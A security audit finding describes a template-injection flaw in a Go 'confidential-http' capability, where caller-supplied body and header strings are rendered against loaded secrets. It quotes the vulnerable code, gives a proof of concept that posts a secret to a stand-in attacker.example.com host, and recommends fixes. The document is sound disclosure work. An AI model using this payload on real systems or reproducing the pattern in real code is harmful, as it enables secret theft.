### Title
Secret Exfiltration via Go Template Injection in Confidential HTTP Action Body/Headers - ([File: core/capabilities/fakes/confidential_http_action.go])

### Summary
`DirectConfidentialHTTPAction.SendRequest` parses attacker-controlled request body and header strings as Go `text/template` sources and executes them against a data map populated with resolved secret values, then sends the rendered result to an attacker-controlled URL. This lets an unprivileged workflow author who only has capability-level access to the "confidential-http" action exfiltrate secret values they should not otherwise be able to read directly, analogous to the pycel bug class where an attacker-supplied "formula" string is evaluated with unintended access to sensitive execution context.

### Finding Description
The capability loads secret values from a local secrets file/environment variables into `secretsConfig.SecretsNames`, building a `templateData` map keyed by secret name: [1](#0-0) 

It then takes the workflow-supplied request body string (`req.GetBodyString()`) directly from the `ConfidentialHTTPRequest` input and compiles/executes it as a Go template using `text/template`, with `templateData` (containing the secret values) as the execution context: [2](#0-1) 

The same pattern is repeated for every header value supplied in the request: [3](#0-2) 

Because `text/template` allows referencing arbitrary top-level fields of the passed data (e.g. `{{.SECRET_NAME}}`, or with range/index constructs for slice-valued secrets), a caller who controls the body/header strings of the request can construct a template that renders any secret present in `templateData` into the outgoing HTTP body or headers. Since the same request also carries the destination URL (`req.GetUrl()`), which is also attacker-controlled and sent unmodified via `http.NewRequestWithContext(ctx, method, req.GetUrl(), ...)`, the caller can point the request at a server they control and have the secret value delivered to them in the request body/headers.

This mirrors the pycel bug class: user-supplied "formula"/template syntax is evaluated with access to a data/execution context (there, arbitrary Python via `eval`; here, arbitrary top-level fields of a Go template context) that the calling principal should not be able to read directly.

### Impact Explanation
Any principal able to invoke this capability with an arbitrary body/header/url (a "malicious API/RPC client" style unprivileged workflow author submitting crafted capability inputs) can exfiltrate secret material loaded by the node operator (e.g. credentials resolved from `SECRETS_FILE`/environment variables, including the special `san_marino_aes_gcm_encryption_key` used for output encryption) to an external, attacker-controlled endpoint. This is a concrete secret/key disclosure impact.

### Likelihood Explanation
Exploitation only requires the ability to submit a `ConfidentialHTTPRequest` (URL + body/header strings) to this capability — no additional privilege beyond normal capability invocation is needed, and the templating logic performs no sanitization or restriction on which template fields can be referenced (no allow-list, no `Option("missingkey=error")` restriction combined with data-shape control, no removal of secret keys from the template context before parsing user input).

### Recommendation
- Never pass a caller-supplied string directly to `text/template.Parse`/`Execute` against a context containing secrets. If templating of body/headers is a required feature, use a fixed, operator-defined template (not attacker-supplied) or restrict interpolation to an explicit, non-secret allow-listed variable set.
- If secrets must be injectable into outbound requests, resolve secret placeholders via a controlled substitution mechanism that never exposes the full secret map to arbitrary template evaluation (e.g., named placeholder tokens resolved by the platform after validating the destination is an approved DON/vault-controlled endpoint).
- Add validation/allow-listing of destination URLs so that requests carrying secret-derived content cannot be redirected to arbitrary attacker-controlled hosts.

### Proof of Concept
1. As a workflow author with access to invoke the `confidential-http@1.0.0-alpha` capability, submit a `ConfidentialHTTPRequest` with:
   - `Url` = `https://attacker.example.com/collect`
   - `Method` = `POST`
   - `BodyString` = `{{.MY_SECRET_NAME}}` (where `MY_SECRET_NAME` matches a key present in the node's `secretsConfig.SecretsNames`, e.g. discoverable via job/capability configuration documentation or brute-forced from known secret names).
2. `SendRequest` parses the body as a Go template and executes it with `templateData` populated with the resolved secret value, per [4](#0-3) .
3. The rendered body (containing the plaintext secret value) is POSTed to `https://attacker.example.com/collect`, exfiltrating the secret to the attacker's server.

### Citations

**File:** core/capabilities/fakes/confidential_http_action.go (L123-152)
```go
	// Prepare template data from loaded secrets
	templateData := make(map[string]any)
	for k, v := range fh.secretsConfig.SecretsNames {
		if len(v) == 1 {
			templateData[k] = v[0]
		} else {
			templateData[k] = v
		}
	}

	usesBody := method == "POST" || method == "PUT" || method == "PATCH" || method == "DELETE"
	bodyString := req.GetBodyString()
	bodyBytes := req.GetBodyBytes()

	var httpReq *http.Request
	var err error

	switch {
	case usesBody && bodyString != "":
		processedBody := &bytes.Buffer{}
		bodyTmpl, err2 := template.New("body").Parse(bodyString)
		if err2 != nil {
			fh.eng.Errorf("error parsing body template: %v", err2)
			return nil, caperrors.NewPublicUserError(errors.New("error parsing body template"), caperrors.InvalidArgument)
		}
		if err2 = bodyTmpl.Execute(processedBody, templateData); err2 != nil {
			fh.eng.Errorf("error executing body template: %v", err2)
			return nil, caperrors.NewPublicUserError(errors.New("error executing body template"), caperrors.InvalidArgument)
		}
		httpReq, err = http.NewRequestWithContext(ctx, method, req.GetUrl(), processedBody)
```

**File:** core/capabilities/fakes/confidential_http_action.go (L164-183)
```go
	// Add headers with template processing
	for name, headerValues := range req.GetMultiHeaders() {
		if headerValues != nil {
			for _, value := range headerValues.GetValues() {
				headerTmpl, tmplErr := template.New("header").Parse(value)
				if tmplErr != nil {
					fh.eng.Errorf("error parsing header template for %s: %v", name, tmplErr)
					return nil, caperrors.NewPublicUserError(errors.New("error parsing header template"), caperrors.InvalidArgument)
				}

				var processedHeader bytes.Buffer
				if tmplErr = headerTmpl.Execute(&processedHeader, templateData); tmplErr != nil {
					fh.eng.Errorf("error executing header template for %s: %v", name, tmplErr)
					return nil, caperrors.NewPublicUserError(errors.New("error executing header template"), caperrors.InvalidArgument)
				}

				httpReq.Header.Add(name, processedHeader.String())
			}
		}
	}
```
